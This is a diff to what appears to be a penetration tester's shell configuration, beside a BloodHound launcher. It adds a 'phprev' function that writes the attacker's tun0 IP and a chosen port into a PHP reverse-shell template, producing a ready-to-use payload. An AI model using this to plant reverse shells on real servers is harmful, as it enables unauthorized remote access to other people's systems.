@@ -194,3 +194,12 @@ bloodhnd() {
 terminator -T "neo4j" -e "sudo neo4j console"
 sudo bloodhound &
 }
+
+
+phprev() {
+# Adds IP and Port to /opt/php-reverse-shell/php-reverse-shell.php
+# Usage: phprev <port number>
+# Output to Desktop
+ipaddy=$(sudo ifconfig tun0 | grep "inet " | tr -s " " | cut -d " " -f 3)
+lhost="$ipaddy";lport="$1"; cat /opt/php-reverse-shell/php-reverse-shell.php | sed "s/^\$ip.*/\$ip = $lhost;/g" | sed "s/^\$port.*/\$port = $lport;/g" > ~/Desktop/php-reverse-shell.php
+}
